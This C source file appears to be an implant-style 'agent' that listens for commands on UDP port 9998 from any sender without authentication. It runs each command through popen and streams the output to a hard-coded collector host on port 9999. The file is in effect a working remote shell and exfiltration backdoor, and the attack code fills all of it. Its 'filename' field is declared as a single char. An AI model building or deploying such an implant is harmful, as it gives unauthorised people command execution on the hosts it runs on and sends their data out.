#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define CONSOLE_PORT 9998
#define COLLECTOR_PORT 9999
#define SERVER_IP "192.168.1.10"
#define FILE_CHUNK 512

struct NetworkMessage {
    int message_type;        // 1 = Alert, 2 = File Data, 3 = Command Output
    char filename;
    char payload[FILE_CHUNK];
    int payload_len;
};

// Global network helper
void send_udp_response(const struct NetworkMessage *msg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(COLLECTOR_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    sendto(sock, msg, sizeof(struct NetworkMessage), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    close(sock);
}

// Feature: Run a program/command on the target and capture output
void execute_system_program(const char *cmd_str) {
    FILE *pipe = popen(cmd_str, "r");
    if (!pipe) return;

    struct NetworkMessage resp;
    memset(&resp, 0, sizeof(resp));
    resp.message_type = 3; // Command execution flag

    // Read the program output and stream it back via UDP
    while (fgets(resp.payload, FILE_CHUNK, pipe) != NULL) {
        resp.payload_len = strlen(resp.payload);
        send_udp_response(&resp);
        usleep(2000); 
    }

    // End of output indicator
    resp.payload_len = 0;
    send_udp_response(&resp);
    pclose(pipe);
}

// Separate thread to listen for remote execution requests
void *command_listener_thread(void *arg) {
    int sock;
    struct sockaddr_in local_addr;
    char cmd_buffer[1024];
    (void)arg;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) return NULL;

    local_addr.sin_family = AF_INET;
    local_addr.sin_addr.s_addr = INADDR_ANY;
    local_addr.sin_port = htons(CONSOLE_PORT);

    if (bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr)) >= 0) {
        while (1) {
            memset(cmd_buffer, 0, sizeof(cmd_buffer));
            int len = recvfrom(sock, cmd_buffer, sizeof(cmd_buffer) - 1, 0, NULL, NULL);
            if (len > 0) {
                // Strip trailing newline characters if present
                cmd_buffer[strcspn(cmd_buffer, "\n")] = 0;
                execute_system_program(cmd_buffer);
            }
        }
    }
    close(sock);
    return NULL;
}

int main(void) {
    pthread_t thread_id;
    // Launch execution console listener as a parallel thread
    if (pthread_create(&thread_id, NULL, command_listener_thread, NULL) != 0) {
        perror("Failed to create listener thread");
        return 1;
    }

    // Inotify loop from previous iteration remains here
    printf("[AGENT] Operating directory watcher and command listener...\n");
    while(1) { sleep(10); } // Placeholder for continuous parent flow execution
    return 0;
}
